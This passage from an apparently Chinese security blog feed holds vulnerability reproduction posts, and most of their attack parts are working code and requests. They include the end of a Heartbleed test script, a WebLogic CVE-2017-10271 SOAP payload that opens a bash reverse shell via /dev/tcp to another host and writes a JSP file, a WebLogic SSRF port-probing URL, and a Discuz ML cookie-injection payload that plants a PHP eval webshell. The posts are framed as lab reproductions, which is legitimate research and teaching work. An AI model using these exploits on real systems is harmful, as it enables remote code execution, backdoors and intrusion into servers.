class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"># Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)</span><br><span class="line"># The author disclaims copyright to this source code.</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line">import socket</span><br><span class="line">import time</span><br><span class="line">import select</span><br><span class="line">import re</span><br><span class="line">from optparse import OptionParser</span><br><span class="line"></span><br><span class="line">options &#x3D; OptionParser(usage&#x3D;&#39;%prog server [options]&#39;, description&#x3D;&#39;Test for SSL heartbeat vulnerability (CVE-2014-0160)&#39;)</span><br><span class="line">options.add_option(&#39;-p&#39;, &#39;--port&#39;, type&#x3D;&#39;int&#39;, default&#x3D;443, help&#x3D;&#39;TCP port to test (default: 443)&#39;)</span><br><span class="line"></span><br><span class="line">def h2bin(x):</span><br><span class="line">    return x.replace(&#39; &#39;, &#39;&#39;).replace(&#39;\n&#39;, &#39;&#39;).decode(&#39;hex&#39;)</span><br><span class="line"></span><br><span class="line">hello &#x3D; h2bin(&#39;&#39;&#39;</span><br><span class="line">16 03 02 00  dc 01 00 00 d8 03 02 53</span><br><span class="line">43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf</span><br><span class="line">bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00</span><br><span class="line">00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88</span><br><span class="line">00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c</span><br><span class="line">c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09</span><br><span class="line">c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44</span><br><span class="line">c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c</span><br><span class="line">c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11</span><br><span class="line">00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04</span><br><span class="line">03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19</span><br><span class="line">00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08</span><br><span class="line">00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13</span><br><span class="line">00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00</span><br><span class="line">00 0f 00 01 01                                  </span><br><span class="line">&#39;&#39;&#39;)</span><br><span class="line"></span><br><span class="line">hb &#x3D; h2bin(&#39;&#39;&#39; </span><br><span class="line">18 03 02 00 03</span><br><span class="line">01 40 00</span><br><span class="line">&#39;&#39;&#39;)</span><br><span class="line"></span><br><span class="line">def hexdump(s):</span><br><span class="line">    for b in xrange(0, len(s), 16):</span><br><span class="line">        lin &#x3D; [c for c in s[b : b + 16]]</span><br><span class="line">        hxdat &#x3D; &#39; &#39;.join(&#39;%02X&#39; % ord(c) for c in lin)</span><br><span class="line">        pdat &#x3D; &#39;&#39;.join((c if 32 &lt;&#x3D; ord(c) &lt;&#x3D; 126 else &#39;.&#39; )for c in lin)</span><br><span class="line">        print &#39;  %04x: %-48s %s&#39; % (b, hxdat, pdat)</span><br><span class="line">    print</span><br><span class="line"></span><br><span class="line">def recvall(s, length, timeout&#x3D;5):</span><br><span class="line">    endtime &#x3D; time.time() + timeout</span><br><span class="line">    rdata &#x3D; &#39;&#39;</span><br><span class="line">    remain &#x3D; length</span><br><span class="line">    while remain &gt; 0:</span><br><span class="line">        rtime &#x3D; endtime - time.time() </span><br><span class="line">        if rtime &lt; 0:</span><br><span class="line">            return None</span><br><span class="line">        r, w, e &#x3D; select.select([s], [], [], 5)</span><br><span class="line">        if s in r:</span><br><span class="line">            data &#x3D; s.recv(remain)</span><br><span class="line">            # EOF?</span><br><span class="line">            if not data:</span><br><span class="line">                return None</span><br><span class="line">            rdata +&#x3D; data</span><br><span class="line">            remain -&#x3D; len(data)</span><br><span class="line">    return rdata</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">def recvmsg(s):</span><br><span class="line">    hdr &#x3D; recvall(s, 5)</span><br><span class="line">    if hdr is None:</span><br><span class="line">        print &#39;Unexpected EOF receiving record header - server closed connection&#39;</span><br><span class="line">        return None, None, None</span><br><span class="line">    typ, ver, ln &#x3D; struct.unpack(&#39;&gt;BHH&#39;, hdr)</span><br><span class="line">    pay &#x3D; recvall(s, ln, 10)</span><br><span class="line">    if pay is None:</span><br><span class="line">        print &#39;Unexpected EOF receiving record payload - server closed connection&#39;</span><br><span class="line">        return None, None, None</span><br><span class="line">    print &#39; ... received message: type &#x3D; %d, ver &#x3D; %04x, length &#x3D; %d&#39; % (typ, ver, len(pay))</span><br><span class="line">    return typ, ver, pay</span><br><span class="line"></span><br><span class="line">def hit_hb(s):</span><br><span class="line">    s.send(hb)</span><br><span class="line">    while True:</span><br><span class="line">        typ, ver, pay &#x3D; recvmsg(s)</span><br><span class="line">        if typ is None:</span><br><span class="line">            print &#39;No heartbeat response received, server likely not vulnerable&#39;</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">        if typ &#x3D;&#x3D; 24:</span><br><span class="line">            print &#39;Received heartbeat response:&#39;</span><br><span class="line">            hexdump(pay)</span><br><span class="line">            if len(pay) &gt; 3:</span><br><span class="line">                print &#39;WARNING: server returned more data than it should - server is vulnerable!&#39;</span><br><span class="line">            else:</span><br><span class="line">                print &#39;Server processed malformed heartbeat, but did not return any extra data.&#39;</span><br><span class="line">            return True</span><br><span class="line"></span><br><span class="line">        if typ &#x3D;&#x3D; 21:</span><br><span class="line">            print &#39;Received alert:&#39;</span><br><span class="line">            hexdump(pay)</span><br><span class="line">            print &#39;Server returned error, likely not vulnerable&#39;</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    opts, args &#x3D; options.parse_args()</span><br><span class="line">    if len(args) &lt; 1:</span><br><span class="line">        options.print_help()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    print &#39;Connecting...&#39;</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    s.connect((args[0], opts.port))</span><br><span class="line">    print &#39;Sending Client Hello...&#39;</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    s.send(hello)</span><br><span class="line">    print &#39;Waiting for Server Hello...&#39;</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    while True:</span><br><span class="line">        typ, ver, pay &#x3D; recvmsg(s)</span><br><span class="line">        if typ &#x3D;&#x3D; None:</span><br><span class="line">            print &#39;Server closed connection without sending Server Hello.&#39;</span><br><span class="line">            return</span><br><span class="line">        # Look for server hello done message.</span><br><span class="line">        if typ &#x3D;&#x3D; 22 and ord(pay[0]) &#x3D;&#x3D; 0x0E:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    print &#39;Sending heartbeat request...&#39;</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    s.send(hb)</span><br><span class="line">    hit_hb(s)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计基础</title>
      <link href="/2019/08/26/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/"/>
      <url>/2019/08/26/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="PHP代码审计基础"><a href="#PHP代码审计基础" class="headerlink" title="PHP代码审计基础"></a>PHP代码审计基础</h3><ul><li><a href="#_2">思维导图</a></li><li><ul><li><a href="#_4">新的改变</a></li></ul></li></ul><h1 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h1><p><img src="https://img-blog.csdnimg.cn/20190311085916924.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="新的改变"><a href="#新的改变" class="headerlink" title="新的改变"></a>新的改变</h2><p>论PHP常见的漏洞<br>′ 雨。 · 2015/01/14 10:08</p><p><a href="http://www.anquan.us/static/drops/papers-4544.html" target="_blank" rel="noopener">http://www.anquan.us/static/drops/papers-4544.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【研究】weblogic漏洞系列XMLDecoder 反序列化漏洞（CVE-2017-10271）</title>
      <link href="/2019/08/15/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91weblogic%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97XMLDecoder%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-10271%EF%BC%89/"/>
      <url>/2019/08/15/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91weblogic%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97XMLDecoder%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-10271%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="【研究】weblogic漏洞系列-‘wls-wsat’-XMLDecoder-反序列化漏洞（CVE-2017-10271）"><a href="#【研究】weblogic漏洞系列-‘wls-wsat’-XMLDecoder-反序列化漏洞（CVE-2017-10271）" class="headerlink" title="【研究】weblogic漏洞系列- ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）"></a>【研究】weblogic漏洞系列- ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）</h3><ul><li><ul><li><a href="#1_2">1.环境</a></li><li><a href="#2_7">2.原理</a></li><li><a href="#3_13">3.影响版本</a></li><li><a href="#4_19">4.利用过程</a></li></ul></li></ul><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>环境<br><a href="https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md</a><br>这个搭环境很方便快捷，具体可以看说明，很简单</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><p>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令</p><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>Oracle WebLogic Server 10.3.6.0.0版本</p><p>Oracle WebLogic Server 12.1.3.0.0版本</p><p>Oracle WebLogic Server 12.2.1.1.0版本</p><h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p>POC反弹shell<br>反弹shell的语句，需要进行编码，，否则解析XML的时候将出现格式错误</p><p><strong>注意实验环境不能只有ip 还有端口 10.77.0.130:7001</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;wls-wsat&#x2F;CoordinatorPortType HTTP&#x2F;1.1</span><br><span class="line">Host: 10.77.0.130:7001</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text&#x2F;xml</span><br><span class="line">Content-Length: 634</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;</span><br><span class="line">&lt;java version&#x3D;&quot;1.4.0&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;void class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class&#x3D;&quot;java.lang.String&quot; length&#x3D;&quot;3&quot;&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;&#x2F;bin&#x2F;bash&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.77.0.58&#x2F;666 0&gt;&amp;1&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;array&gt;</span><br><span class="line">&lt;void method&#x3D;&quot;start&quot;&#x2F;&gt;&lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;java&gt;</span><br><span class="line">&lt;&#x2F;work:WorkContext&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><p>反弹SHell成功<br><img src="https://img-blog.csdnimg.cn/20190815164715796.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>访问：<a href="http://your-ip:7001/bea\_wls\_internal/test.jsp" target="_blank" rel="noopener">http://your-ip:7001/bea\_wls\_internal/test.jsp</a><br>写入webshell的POC<br>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.txt写文件。<br>文件名称为xxxx文件内容为xxxx<br>成功发送请求之后服务器会返回 500 status code。<br>需要注意的地方是头部必须加上Content-Type: text/xml请求会出错。</p><p><strong>注意实验环境不能只有ip 还有端口 10.77.0.130:7001</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;wls-wsat&#x2F;CoordinatorPortType HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:7001</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text&#x2F;xml</span><br><span class="line">Content-Length: 638</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt;</span><br><span class="line">    &lt;soapenv:Header&gt;</span><br><span class="line">    &lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;</span><br><span class="line">    &lt;java&gt;&lt;java version&#x3D;&quot;1.4.0&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">    &lt;object class&#x3D;&quot;java.io.PrintWriter&quot;&gt; </span><br><span class="line">    &lt;string&gt;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls_internal&#x2F;9j4dqk&#x2F;war&#x2F;test.jsp&lt;&#x2F;string&gt;</span><br><span class="line">    &lt;void method&#x3D;&quot;println&quot;&gt;&lt;string&gt;</span><br><span class="line">    &lt;![CDATA[</span><br><span class="line">&lt;% out.print(&quot;test&quot;); %&gt;</span><br><span class="line">    ]]&gt;</span><br><span class="line">    &lt;&#x2F;string&gt;</span><br><span class="line">    &lt;&#x2F;void&gt;</span><br><span class="line">    &lt;void method&#x3D;&quot;close&quot;&#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;object&gt;&lt;&#x2F;java&gt;&lt;&#x2F;java&gt;</span><br><span class="line">    &lt;&#x2F;work:WorkContext&gt;</span><br><span class="line">    &lt;&#x2F;soapenv:Header&gt;</span><br><span class="line">    &lt;soapenv:Body&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2019081517241877.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上传路径为<a href="http://10.77.0.130:7001/bea\_wls\_internal/tt.jsp" target="_blank" rel="noopener">http://10.77.0.130:7001/bea\_wls\_internal/tt.jsp</a></p><p><img src="https://img-blog.csdnimg.cn/20190815172826461.png" alt="在这里插入图片描述"></p><p>注意实验环境不能只有ip 还有端口 10.77.0.130:7001</p><p>注意实验环境不能只有ip 还有端口 10.77.0.130:7001</p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【研究】weblogic漏洞系列-SSRF漏洞</title>
      <link href="/2019/08/15/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91weblogic%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97-SSRF%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/08/15/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91weblogic%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97-SSRF%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="【研究】weblogic漏洞系列-SSRF漏洞"><a href="#【研究】weblogic漏洞系列-SSRF漏洞" class="headerlink" title="【研究】weblogic漏洞系列-SSRF漏洞"></a>【研究】weblogic漏洞系列-SSRF漏洞</h3><ul><li><ul><li><a href="#1_3">1.环境</a></li><li><a href="#2_8">2.原理</a></li><li><a href="#3_12">3.影响版本</a></li><li><a href="#4_14">4.利用过程</a></li><li><a href="#HTTPRedisshell_51">注入HTTP头，利用Redis反弹shell</a></li></ul></li></ul><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>环境<br><a href="https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md</a><br>这个搭环境很方便快捷，具体可以看说明，很简单</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><p>Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。<br>访问<code>http://ip:7001/uddiexplorer/</code>，无需登录即可查看uddiexplorer</p><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p>环境打开</p><p>SSRF漏洞存在于<code>http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code>，直接访问</p><p><img src="https://img-blog.csdnimg.cn/20190815150021563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>payload:<br>?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=<a href="http://127.0.0.1:7001" target="_blank" rel="noopener">http://127.0.0.1:7001</a></p><p>加入url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.77.0.130:7001&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;127.0.0.1:7001</span><br></pre></td></tr></table></figure><p>`</p><p>关键点是operator这个参数</p><ul><li>可访问的端口将会得到错误，访问7001端口时返回一个404的状态码。</li><li>修改为一个不存在的端口，将会返回<code>could not connect over HTTP to server</code></li></ul><p>存在<br><img src="https://img-blog.csdnimg.cn/20190815151338337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>不存在<br><img src="https://img-blog.csdnimg.cn/20190815151345115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>内网端口探测</p><p>我们可以根据返回的不同状态信息，来判断内网的IP是否存在以及对应端口是否开放。这里有一个地方需要注意的是，需要知道目标内网网段。如果盲目的去进行网段扫描会耗费大量的时间。</p><p>实战挖掘中发现这个位置有可能会泄露内网网段。</p><p>实战存在的情况<br><img src="https://img-blog.csdnimg.cn/2019081515211894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="注入HTTP头，利用Redis反弹shell"><a href="#注入HTTP头，利用Redis反弹shell" class="headerlink" title="注入HTTP头，利用Redis反弹shell"></a>注入HTTP头，利用Redis反弹shell</h2><p>下一遍分开写吧，是可以的</p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> weblogic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Discuz Ml v3.x 前台Getshell姿势 Discuz漏洞</title>
      <link href="/2019/07/14/Discuz%20Ml%20v3.x%20%E5%89%8D%E5%8F%B0Getshell%E5%A7%BF%E5%8A%BF%20Discuz%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/07/14/Discuz%20Ml%20v3.x%20%E5%89%8D%E5%8F%B0Getshell%E5%A7%BF%E5%8A%BF%20Discuz%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="Discuz-Ml-v3-x-前台Getshell姿势"><a href="#Discuz-Ml-v3-x-前台Getshell姿势" class="headerlink" title="Discuz Ml v3.x 前台Getshell姿势"></a>Discuz Ml v3.x 前台Getshell姿势</h3><ul><li><ul><li><a href="#1_2">1.漏洞描述</a></li><li><a href="#2_10">2.原理</a></li><li><a href="#3_20">3.影响版本</a></li><li><a href="#4_26">4.利用过程</a></li><li><a href="#4getshell_POC_46">4.getshell POC</a></li><li><a href="#_68">请勿用于非法用途</a></li></ul></li></ul><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1.漏洞描述"></a>1.漏洞描述</h2><p>Discuz！ML是一个由CodersClub.org创建的多语言，集成，功能齐全的开源网络平台，用于构建像“社交网络”这样的互联网社区。</p><p>2019年7月11日， Discuz！ML被发现存在一处远程代码执行漏洞，攻击者通过在请求流量的cookie字段中的language参数处插入构造的payload，进行远程代码执行利用，该漏洞利用方式简单，危害性较大。</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><blockquote><p>由于Discuz! ML对于cookie字段的不恰当处理造成的<br>cookie字段中的language参数未经过滤，直接被拼接写入缓存文件之中，<br>而缓存文件随后又被加载，从而造成代码执行</p></blockquote><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p><strong>Discuz! ML v.3.4<br>Discuz! ML v.3.3<br>Discuz! ML v.3.2</strong></p><h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p>简而言之，通过cookie传入payload，构造好的payload被写入template文件中:</p><p>注意这是国际版的，不是国内的那种，一般要有语言选择的才行，大部分都是国外的论坛<br>类似于有这种的<br><img src="https://img-blog.csdnimg.cn/20190714182907753.png" alt="在这里插入图片描述"></p><p>问题出在</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XXXX_language&#x3D;</span><br></pre></td></tr></table></figure><p>测试PAYLOAD</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XXXX_language&#x3D;&#39;.phpinfo().&#39;;</span><br></pre></td></tr></table></figure><p>XXX自己改一下<br><img src="https://img-blog.csdnimg.cn/20190714183142897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>GO一下看结果<br><img src="https://img-blog.csdnimg.cn/20190714183208411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="4-getshell-POC"><a href="#4-getshell-POC" class="headerlink" title="4.getshell POC"></a>4.getshell POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%27.+file_put_contents%28%27godz.php%27%2Curldecode%28%27%253c%253fphp+%2520eval%28%2524_%2547%2545%2554%255b%2522godz%2522%255d%29%253b%253f%253e%27%29%29.%27</span><br></pre></td></tr></table></figure><p>原始的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;.+file_put_contents(&#39;godz.php&#39;,urldecode(&#39;&lt;?php  eval($_GET[&quot;godz&quot;]);?&gt;&#39;)).&#39;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190714183737657.png" 